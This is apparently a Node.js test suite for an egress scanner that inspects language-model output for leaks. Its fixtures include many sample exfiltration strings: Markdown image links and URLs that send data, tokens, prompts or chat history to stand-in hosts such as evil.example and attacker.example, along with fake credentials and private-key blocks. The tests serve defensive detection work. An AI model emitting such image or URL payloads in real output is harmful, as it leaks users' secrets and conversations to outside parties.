import test from 'node:test';
import assert from 'node:assert/strict';
import { inspectOutput, sanitizeOutput, scanEgress } from '../src/index.mjs';
import { hasFinding } from './helpers.mjs';

function makeToken(seed, length) {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  let output = '';
  for (let i = 0; i < length; i += 1) {
    output += alphabet[(seed + i * 17) % alphabet.length];
  }
  return output;
}

function luhnComplete(prefix) {
  for (let digit = 0; digit <= 9; digit += 1) {
    const candidate = prefix + String(digit);
    let sum = 0;
    let doubleDigit = false;
    for (let i = candidate.length - 1; i >= 0; i -= 1) {
      let value = candidate.charCodeAt(i) - 48;
      if (doubleDigit) {
        value *= 2;
        if (value > 9) value -= 9;
      }
      sum += value;
      doubleDigit = !doubleDigit;
    }
    if (sum % 10 === 0) return candidate;
  }
  throw new Error('no luhn digit');
}

const canaries = [
  'cage-canary-alpha-001',
  'do-not-repeat-7f3a91',
  'prompt-canary-zulu',
  'private-canary-value',
  'egress sentinel text',
  'test canary omega',
  'synthetic-marker-12345',
  'model-output-canary',
  'hidden benchmark phrase',
  'integrity-check-string'
];
for (const canary of canaries) {
  test('canary token blocked in output: ' + canary.slice(0, 24), () => {
    const report = inspectOutput('safe prefix ' + canary + ' safe suffix', { canaryTokens: [canary] });
    assert.ok(hasFinding(report, 'GP-EGR-CANARY-001'));
    assert.equal(report.action, 'block');
    assert.equal(report.redacted.includes(canary), false);
  });
}

const markdownImages = [
  '![x](https://evil.example/img?data=abcdefghijklmnopqrstuvwx)',
  '![alt](https://attacker.example/pixel?token=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![](https://collect.example/a.png?secret=123456789012345678901234)',
  '![diagram](http://example.net/i?prompt=abcdefghijklmnopqrstuvwx)',
  '![x](https://example.com/a?key=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![x](https://example.com/a?password=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![x](https://example.com/a?history=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![x](https://example.com/a?messages=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![x](https://example.com/a?context=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![x](https://example.com/a?session=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![x](https://example.com/a?payload=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![x](https://example.com/a.png?data=ABCDEFGHIJKLMNOPQRSTUVWX)',
  '![wide alt text](https://example.org/x?data=abcdefghijklmnopqrstuvwx)',
  '![x](https://sub.example.co.uk/img?data=abcdefghijklmnopqrstuvwx)',
  '![x](http://insecure.example/img?data=abcdefghijklmnopqrstuvwx)'
];
for (const input of markdownImages) {
  test('markdown image exfiltration channel detected: ' + input.slice(0, 38), () => {
    const findings = scanEgress(input);
    assert.ok(hasFinding(findings, 'GP-EGR-MARKDOWN-IMG-001'));
  });
}

test('trusted Markdown image host is allowed', () => {
  const input = '![x](https://images.example.com/a.png)';
  const findings = scanEgress(input, { trustedImageHosts: ['example.com'] });
  assert.equal(hasFinding(findings, 'GP-EGR-MARKDOWN-IMG-001'), false);
});

test('trusted host matching includes subdomains but not lookalike suffixes', () => {
  const good = scanEgress('![x](https://cdn.example.com/a.png)', { trustedImageHosts: ['example.com'] });
  const bad = scanEgress('![x](https://badexample.com/a.png)', { trustedImageHosts: ['example.com'] });
  assert.equal(hasFinding(good, 'GP-EGR-MARKDOWN-IMG-001'), false);
  assert.equal(hasFinding(bad, 'GP-EGR-MARKDOWN-IMG-001'), true);
});

const dataUrls = [
  'data:text/html;base64,QUJDREVGR0hJSktMTU5P',
  'data:image/svg+xml;base64,QUJDREVGR0hJSktMTU5P',
  'data:image/png;base64,QUJDREVGR0hJSktMTU5P',
  'data:text/plain,abcdefgh',
  'data:application/octet-stream;base64,QUJDREVGR0hJSktMTU5P',
  'data:text/html,abcdefgh',
  'data:image/gif;base64,QUJDREVGR0hJSktMTU5P',
  'data:image/jpeg;base64,QUJDREVGR0hJSktMTU5P',
  'data:application/pdf;base64,QUJDREVGR0hJSktMTU5P',
  'data:text/plain;base64,QUJDREVGR0hJSktMTU5P'
];
for (const input of dataUrls) {
  test('data URL egress shape detected: ' + input.slice(0, 36), () => {
    assert.ok(hasFinding(scanEgress('x ' + input + ' y'), 'GP-EGR-DATAURL-001'));
  });
}

const credentialAssignments = [
  'api_key = cage-test-token-abcdef123456',
  'apikey: cage-test-token-abcdef123456',
  'api-key = "cage-test-token-abcdef123456"',
  'token = cage-test-token-abcdef123456',
  'access_token = cage-test-token-abcdef123456',
  'access-token: cage-test-token-abcdef123456',
  'auth_token = cage-test-token-abcdef123456',
  'secret = cage-test-token-abcdef123456',
  'password = correct-horse-test-value',
  'client_secret = cage-test-token-abcdef123456',
  'private_token = cage-test-token-abcdef123456',
  'Authorization: Bearer abcdef1234567890',
  'authorization: bearer abcdef1234567890abcdef',
  'API_KEY=cage-test-token-abcdef123456',
  'TOKEN: cage-test-token-abcdef123456',
  'secret: "cage-test-token-abcdef123456"',
  'password = pass-word-test-123456',
  'client-secret = cage-test-token-abcdef123456',
  'private-token = cage-test-token-abcdef123456',
  'auth-token = cage-test-token-abcdef123456'
];
for (const input of credentialAssignments) {
  test('credential pattern redacted and blocked: ' + input.slice(0, 34), () => {
    const report = inspectOutput('prefix ' + input + ' suffix');
    assert.ok(hasFinding(report, 'GP-EGR-CREDENTIAL-001'));
    assert.equal(report.action, 'block');
    assert.equal(report.redacted.includes('cage-test-token-abcdef123456'), false);
  });
}

const privateKeys = [
  '-----BEGIN PRIVATE KEY-----\nMIIBtest\n-----END PRIVATE KEY-----',
  '-----BEGIN RSA PRIVATE KEY-----\nMIIBtest\n-----END RSA PRIVATE KEY-----',
  '-----BEGIN EC PRIVATE KEY-----\nMIIBtest\n-----END EC PRIVATE KEY-----',
  '-----BEGIN OPENSSH PRIVATE KEY-----\nMIIBtest\n-----END OPENSSH PRIVATE KEY-----'
];
for (const input of privateKeys) {
  test('private key block boundary detected: ' + input.slice(11, 40), () => {
    const report = inspectOutput(input);
    assert.ok(hasFinding(report, 'GP-EGR-PRIVATEKEY-001'));
    assert.equal(report.action, 'block');
  });
}

for (let seed = 11; seed <= 13; seed += 1) {
  test('three-part token shape detected seed ' + seed, () => {
    const token = 'eyJ' + makeToken(seed, 24).replace(/[+/=]/g, 'A') + '.' + makeToken(seed + 1, 24).replace(/[+/=]/g, 'B') + '.' + makeToken(seed + 2, 20).replace(/[+/=]/g, 'C');
    const report = inspectOutput('token value ' + token);
    assert.ok(hasFinding(report, 'GP-EGR-CREDENTIAL-001'));
  });
}

const emails = [
  'person@example.com',
  'first.last@example.org',
  'team+test@example.net',
  'a@example.co',
  'long.name.with.parts@sub.example.com',
  'dash-name@example-domain.com',
  'under_score@example.io',
  'percent%name@example.dev',
  'user123@example.ai',
  'contact@example.security'
];
for (const email of emails) {
  test('email address flagged as PII: ' + email, () => {
    const findings = scanEgress('contact ' + email);
    assert.ok(hasFinding(findings, 'GP-EGR-PII-001'));
  });
}

const identifierNumbers = ['000-00-0000', '123-45-6789', '999-99-9999'];
for (const value of identifierNumbers) {
  test('national identifier shape detected: ' + value, () => {
    assert.ok(hasFinding(scanEgress('id ' + value), 'GP-EGR-PII-001'));
  });
}

const cardPrefixes = ['00000000000000', '0000000000000', '1234500000000', '9999900000000', '5555500000000'];
for (const prefix of cardPrefixes) {
  test('checksum-valid payment-card shape detected for synthetic prefix ' + prefix.slice(0, 6), () => {
    const card = luhnComplete(prefix);
    const findings = scanEgress('card ' + card);
    assert.ok(hasFinding(findings, 'GP-EGR-PII-001'));
  });
}

test('checksum-invalid payment-card shape is not flagged', () => {
  const findings = scanEgress('card 0000000000000001');
  assert.equal(findings.some((finding) => finding.id === 'GP-EGR-PII-001' && finding.description.includes('payment-card')), false);
});

const exfilUrls = [
  'https://evil.example/collect?data=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?token=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?secret=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?key=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?password=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?prompt=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?system=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?history=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?messages=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?context=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?session=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?payload=abcdefghijklmnopqrstuvwx',
  'https://evil.example/collect?data=QUJDREVGR0hJSktMTU5P',
  'https://evil.example/collect?token=0123456789abcdef0123456789abcdef',
  'https://evil.example/collect?secret=' + 'x'.repeat(80)
];
for (const url of exfilUrls) {
  test('URL query exfiltration detected: ' + url.slice(0, 48), () => {
    const findings = scanEgress('open ' + url);
    assert.ok(hasFinding(findings, 'GP-EGR-URL-EXFIL-001'));
  });
}

const benignUrls = [
  'https://example.com/docs',
  'https://example.com/search?q=security',
  'https://example.com/item?id=123',
  'https://example.com/docs?section=llm',
  'https://example.com/page?data=short',
  'https://example.com/page?token=short',
  'https://example.com/path/to/page',
  'http://example.net/reference'
];
for (const url of benignUrls) {
  test('ordinary URL does not trigger exfil rule: ' + url, () => {
    const findings = scanEgress('see ' + url);
    assert.equal(hasFinding(findings, 'GP-EGR-URL-EXFIL-001'), false);
  });
}

for (let seed = 101; seed <= 110; seed += 1) {
  test('high entropy token-shaped output detected seed ' + seed, () => {
    const token = makeToken(seed, 48);
    const findings = scanEgress('value ' + token + ' end');
    assert.ok(hasFinding(findings, 'GP-EGR-HIGHENTROPY-001'));
  });
}

for (let seed = 201; seed <= 205; seed += 1) {
  test('long hexadecimal token-shaped output detected seed ' + seed, () => {
    let state = seed;
    let token = '';
    while (token.length < 48) {
      state = (state * 1664525 + 1013904223) >>> 0;
      token += (state % 16).toString(16);
    }
    const findings = scanEgress('hex ' + token);
    assert.ok(hasFinding(findings, 'GP-EGR-HIGHENTROPY-001'));
  });
}

const benignOutputs = [
  'Here is a concise summary of the document.',
  'The release includes bug fixes and documentation improvements.',
  'Visit https://example.com/docs for public documentation.',
  'Use a password manager to generate unique passwords.',
  'The word token appears in this explanatory sentence.',
  'A private key should never be exposed.',
  'Contact support through the public form.',
  'The image syntax is explained without rendering an image.',
  'Base64 is an encoding, not encryption.',
  'No sensitive data is present here.',
  'Security reviews should be deterministic.',
  'The quick brown fox jumps over the lazy dog.',
  'One two three four five six seven eight nine ten.',
  'ordinarylonglowercasewordwithmeaninglesscontent',
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
];
for (const output of benignOutputs) {
  test('benign output stays low signal: ' + output.slice(0, 42), () => {
    const report = inspectOutput(output);
    assert.equal(report.action, 'allow');
    assert.equal(report.riskScore, 0);
  });
}

test('sanitizeOutput returns redacted output string', () => {
  const output = sanitizeOutput('api_key = cage-test-token-abcdef123456');
  assert.equal(typeof output, 'string');
  assert.equal(output.includes('cage-test-token-abcdef123456'), false);
  assert.ok(output.includes('[redacted]'));
});

test('output redaction preserves safe prefix and suffix', () => {
  const report = inspectOutput('safe prefix api_key = cage-test-token-abcdef123456 safe suffix');
  assert.ok(report.redacted.includes('safe prefix'));
  assert.ok(report.redacted.includes('safe suffix'));
});

test('evidence for credential does not include secret value', () => {
  const report = inspectOutput('api_key = cage-test-token-abcdef123456');
  const finding = report.findings.find((item) => item.id === 'GP-EGR-CREDENTIAL-001');
  assert.equal(finding.evidence.includes('cage-test-token-abcdef123456'), false);
});

test('evidence for URL exfiltration omits query values', () => {
  const secret = 'abcdefghijklmnopqrstuvwx';
  const report = inspectOutput('https://evil.example/collect?data=' + secret);
  const finding = report.findings.find((item) => item.id === 'GP-EGR-URL-EXFIL-001');
  assert.equal(finding.evidence.includes(secret), false);
});

test('same output scan is deterministic', () => {
  const input = 'api_key = cage-test-token-abcdef123456 person@example.com';
  const first = inspectOutput(input);
  const second = inspectOutput(input);
  assert.deepEqual(second.findings, first.findings);
  assert.equal(second.redacted, first.redacted);
});

test('oversized output is rejected before scanning', () => {
  assert.throws(() => inspectOutput('x'.repeat(200), { maxInputLength: 128 }), /exceeds maxInputLength/);
});

test('canaryTokens validates entries', () => {
  assert.throws(() => scanEgress('hello', { canaryTokens: [''] }), /length 1/);
});

test('trustedImageHosts validates entries', () => {
  assert.throws(() => scanEgress('hello', { trustedImageHosts: [''] }), /length 1/);
});

test('all egress findings use CWE-200 and OWASP LLM02', () => {
  const findings = scanEgress('api_key = cage-test-token-abcdef123456 person@example.com');
  assert.ok(findings.length > 0);
  for (const finding of findings) {
    assert.equal(finding.cwe, 'CWE-200');
    assert.equal(finding.owasp, 'LLM02:2025');
  }
});
